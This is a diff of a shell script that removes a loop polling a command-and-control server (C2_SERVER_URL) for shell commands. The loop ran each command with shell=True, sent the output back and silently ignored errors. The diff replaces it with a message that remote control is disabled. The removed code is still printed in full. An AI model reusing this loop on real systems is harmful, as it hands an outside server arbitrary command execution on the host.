@@ -25,35 +25,5 @@ fi
 
 # --------------------------------------------------------------------
 # Main loop – fetch and execute remote shell commands
-while true; do
-  # 1. Retrieve a pending shell command (if any)
-  python - <<'PY'
-import os, requests, subprocess, json, sys
-url = os.getenv('C2_SERVER_URL')
-session = os.getenv('C2_SESSION')
-try:
-    resp = requests.get(f"{url}/api/pop_shell_command", params={"session": session}, timeout=5)
-    if resp.status_code == 200:
-        cmd = resp.json().get('shell_command')
-        if cmd:
-            print(f"[C2 REMOTE COMMAND] {cmd}")
-            proc = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=30)
-            out = (proc.stdout + '\n' + proc.stderr).strip()
-            # Send output back to server
-            log_url = f"{url}/api/logs"
-            payload = {
-                "lines": [f"[REMOTE OUTPUT] {l}" for l in out.split('\n')],
-                "session": session
-            }
-            try:
-                requests.post(log_url, json=payload, timeout=5)
-            except Exception:
-                pass
-            print(out)
-except Exception as e:
-    # Silently ignore any network or execution errors
-    pass
-PY
-  # Small pause to avoid hammering the server
-  sleep 2
-done
+echo "Network remote control is disabled."
+exit 0
